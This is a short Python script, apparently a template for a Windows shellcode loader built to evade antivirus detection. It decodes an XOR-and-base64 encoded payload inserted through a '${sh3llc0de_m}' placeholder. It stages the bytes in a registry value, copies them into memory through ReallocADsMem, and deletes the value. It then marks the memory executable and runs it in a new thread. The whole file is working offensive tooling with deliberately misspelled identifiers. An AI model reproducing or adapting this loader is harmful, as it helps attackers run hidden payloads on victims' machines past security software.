import ctypes
from ctypes import *
from ctypes.wintypes import *
import random
import base64


def test(string, module='encode', key=random.randint(1, 255)):
    if module == 'encode':
        buf = bytearray(string)
        encode_code = b''
        for i in buf:
            b = (255 - i) ^ key
            encode_code += chr(b).encode('hex')
        encode_code += chr(key).encode('hex')
        result = base64.b64encode(encode_code)
        return result
    elif module == 'decode':
        decode_code = bytearray(base64.b64decode(string).decode('hex'))
        sh3llc0de = b""
        key = decode_code[-1]
        for i in decode_code[0:-1]:
            b = 255 - (i ^ key)
            sh3llc0de += chr(b)
        return sh3llc0de
    else:
        print('???')


sh3llc0de_m = "${sh3llc0de_m}"
sh3llc0de = test(sh3llc0de_m, 'decode')

ctypes.windll.Advapi32.RegSetValueExA(-2147483647, "test", None, 3, sh3llc0de,len(sh3llc0de))

LPBYTE = POINTER(c_byte)
ctypes.windll.Activeds.ReallocADsMem.restype = LPBYTE
pttr = ctypes.windll.Activeds.ReallocADsMem(0,len(sh3llc0de),len(sh3llc0de))
data_len = DWORD()
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647, "test", 0, 0, 0, byref(data_len))
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647,"test",0,None,pttr,byref(data_len))
ctypes.windll.Advapi32.RegDeleteValueA(-2147483647, "test")
ctypes.windll.kernel32.VirtualProtect(pttr, len(sh3llc0de), 0x40, ctypes.byref(ctypes.c_long(1)))

hanndle = ctypes.windll.kernel32.CreateThread(0,0,pttr,0,0,ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(hanndle,-1)